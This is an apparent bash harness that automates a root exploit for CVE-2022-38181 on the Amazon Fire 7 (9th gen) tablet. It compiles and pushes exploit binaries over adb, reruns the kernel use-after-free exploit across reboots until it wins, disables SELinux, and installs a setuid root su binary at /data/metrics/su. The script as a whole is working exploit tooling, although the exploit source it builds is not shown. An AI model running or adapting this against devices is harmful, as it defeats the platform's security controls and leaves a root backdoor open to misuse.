#!/usr/bin/env bash
#
# mustang-root — one-shot runner for CVE-2022-38181 on the Amazon Fire 7
# (9th gen, "mustang", MT8163) running Fire OS 7.3.3.1 / kernel 4.9.117.
#
# What it does:
#   1. (optionally) builds `st3` and `su` for armv7-musl
#   2. pushes them to the device
#   3. runs the exploit in a retry loop — the kbase UAF reclaim wins roughly
#      1 boot in 3, and a loss panics/reboots the tablet, so we just reboot
#      and try again
#   4. on success the exploit disables SELinux, installs `/data/metrics/su`
#      (setuid root, non-nosuid mount) and keeps the kctx alive
#   5. verifies `su` is executable and effective as the unprivileged `shell`
#      user, i.e. `su id` reports uid=0
#
# Usage:
#   ./run.sh                 # build if needed, then exploit + verify
#   ./run.sh --build         # force rebuild of st3/su
#   ./run.sh --no-build      # use existing ./st3 and ./su only
#   ./run.sh --attempts 40   # max boot attempts (default 30)
#   ADB=/path/to/adb ./run.sh
#
# Tooling:
#   adb  — from android-tools.  If not in PATH:
#            nix-shell -p android-tools --run './run.sh'
#   zig  — to build armv7 static binaries.  If not in PATH:
#            nix-shell -p zig --run './run.sh --build'
#
set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ADB="${ADB:-adb}"
ST3="$SCRIPT_DIR/st3"
SU="$SCRIPT_DIR/su"
ATTEMPTS=30
BUILD=auto
DEV_ST3=/data/local/tmp/st3
DEV_SU=/data/local/tmp/su_bin
LOG=/data/local/tmp/s3.log
SETTLE=90          # seconds after boot before firing (boot-state matters)

while [ $# -gt 0 ]; do
	case "$1" in
		--build)    BUILD=yes ;;
		--no-build) BUILD=no ;;
		--attempts) ATTEMPTS="$2"; shift ;;
		-h|--help)  sed -n '2,40p' "$0"; exit 0 ;;
		*) echo "unknown arg: $1" >&2; exit 2 ;;
	esac
	shift
done

say()  { printf '%s\n' "$*"; }
die()  { printf 'error: %s\n' "$*" >&2; exit 1; }

have() { command -v "$1" >/dev/null 2>&1; }

# ---------------------------------------------------------------- build ------
build_bin() {
	# $1 = output path, $2... = source(s)
	local out="$1"; shift
	local cmd="zig cc -target arm-linux-musleabihf -static -O2 -o '$out' $*"
	if have zig; then
		eval "$cmd"
	elif have nix-shell; then
		nix-shell -p zig --run "$cmd"
	else
		die "need zig to build $out (or pass --no-build with a prebuilt binary)"
	fi
}

if [ "$BUILD" = yes ] || { [ "$BUILD" = auto ] && { [ ! -x "$ST3" ] || [ ! -x "$SU" ]; }; }; then
	if ! have zig && ! have nix-shell; then
		die "st3/su missing and no zig/nix-shell to build them"
	fi
	say "[*] building st3 and su..."
	build_bin "$ST3" "$SCRIPT_DIR/poc/stage3.c" || exit 1
	build_bin "$SU"  "$SCRIPT_DIR/poc/su.c"     || exit 1
fi
[ -x "$ST3" ] || die "missing $ST3 (run with --build)"
[ -x "$SU" ]  || die "missing $SU (run with --build)"

# ---------------------------------------------------------------- adb --------
if ! have "$ADB"; then
	die "adb not found. Install android-tools, e.g.:
    nix-shell -p android-tools --run '$0 $*'
  or set ADB=/path/to/adb"
fi

A()  { "$ADB" "$@" 2>/dev/null; }
SH() { "$ADB" shell "$1" 2>/dev/null; }
state() { "$ADB" get-state 2>/dev/null; }

wait_boot() {
	A wait-for-device
	for _ in $(seq 1 90); do
		[ "$(SH 'getprop sys.boot_completed' | tr -d '\r')" = "1" ] && return 0
		sleep 3
	done
	return 1
}

settle() {
	local up
	up=$(SH 'cat /proc/uptime' | awk '{print int($1)}')
	[ -z "$up" ] && up=0
	if [ "$up" -lt "$SETTLE" ]; then
		say "[*] settling $((SETTLE - up))s (uptime=${up}s)"
		sleep $((SETTLE - up))
	fi
}

# ---------------------------------------------------------------- run --------

say "[*] device: $(A get-state 2>/dev/null || echo none)"
A wait-for-device >/dev/null 2>&1 || die "no device (adb devices)"

say "[*] rebooting to a clean state..."
A reboot >/dev/null 2>&1
sleep 3
wait_boot || true

say "[*] pushing binaries..."
A push "$ST3" "$DEV_ST3" >/dev/null || die "push st3 failed"
A push "$SU"  "$DEV_SU"  >/dev/null || die "push su failed"
SH "chmod 755 $DEV_ST3"

attempt=0
while [ "$attempt" -lt "$ATTEMPTS" ]; do
	attempt=$((attempt + 1))
	say ""
	say "=== attempt $attempt/$ATTEMPTS ==="

	wait_boot || { sleep 10; continue; }
	settle

	if [ "$(state)" != "device" ]; then
		sleep 10; continue
	fi

	say "[*] firing exploit (nf 200 selroot)..."
	SH "rm -f $LOG /data/local/tmp/pwned; nohup $DEV_ST3 nf 200 selroot >/dev/null 2>&1 &" >/dev/null

	hit=""
	for _ in $(seq 1 60); do
		sleep 5
		if [ "$(state)" != "device" ]; then
			hit="reboot"; break
		fi
		l="$(SH "cat $LOG 2>/dev/null")"
		case "$l" in
			*"HOOK RAN"*|*"ROOT: uid=0"*|*"su installed"*) hit="root"; break ;;
		esac
	done

	if [ "$hit" = "root" ]; then
		say "[+] exploit won on attempt $attempt"
		break
	fi
	say "[-] miss (reclaim lost) — device rebooting; retrying"
	sleep 20
done

if [ "$hit" != "root" ]; then
	die "no root after $ATTEMPTS attempts (reclaim is probabilistic; try again)"
fi

# ---------------------------------------------------------------- verify -----
# SELinux must be permissive and the setuid su must work as the shell user.
say ""
say "[*] verifying..."
SH 'cat /proc/uptime >/dev/null'
ge="$(SH 'getenforce' | tr -d '\r')"
say "    getenforce      : ${ge:-?}"

own="$(SH 'ls -l /data/metrics/su' | tr -d '\r')"
say "    su on device    : ${own:-MISSING}"

ex="$(SH 'test -x /data/metrics/su && echo yes || echo no' | tr -d '\r')"
say "    executable      : $ex"

idout="$(SH '/data/metrics/su id' | tr -d '\r')"
say "    su id (as shell): ${idout:-FAILED}"

if printf '%s' "$idout" | grep -q 'uid=0'; then
	say ""
	say "================================================================"
	say " ROOT OK"
	say ""
	say "   /data/metrics/su id          # run a command as root"
	say "   /data/metrics/su             # interactive root shell"
	say ""
	say " NOTE: runtime only.  A reboot restores SELinux=Enforcing and the"
	say "       setuid su stops being effective — re-run ./run.sh to re-arm."
	say "================================================================"
	exit 0
fi

die "exploit reported root but su didn't produce uid=0 (see above)"
